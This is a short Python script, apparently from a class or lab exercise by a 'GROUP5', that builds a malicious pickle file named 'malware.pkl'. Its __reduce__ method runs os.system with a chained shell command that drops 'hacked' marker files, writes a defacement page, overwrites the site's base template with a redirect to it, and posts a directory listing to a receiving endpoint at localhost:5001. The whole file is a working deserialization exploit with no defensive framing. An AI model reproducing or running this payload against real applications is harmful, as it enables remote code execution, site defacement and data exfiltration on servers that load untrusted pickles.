import pickle
import os

class AtaqueVisual:
    def __reduce__(self):
        cmd = (
            "touch HACKED_BY_GROUP5.txt && "
            "echo 'Servidor comprometido por GROUP5' > static/pwned.txt && "
            "echo \"<html><head><title>Hackeada</title></head><body><h1>ðŸ’€ PÃ¡gina hackeada ðŸ’€</h1></body></html>\" > static/pwned.html && "
            "curl -X POST http://localhost:5001/recibir --data \"usuario=admin&archivos=$(ls)\" && "
            "echo '<meta http-equiv=\"refresh\" content=\"0; URL=/static/pwned.html\">' > templates/base.html"
        )
        return (os.system, (cmd,))

with open('malware.pkl', 'wb') as f:
    pickle.dump(AtaqueVisual(), f)
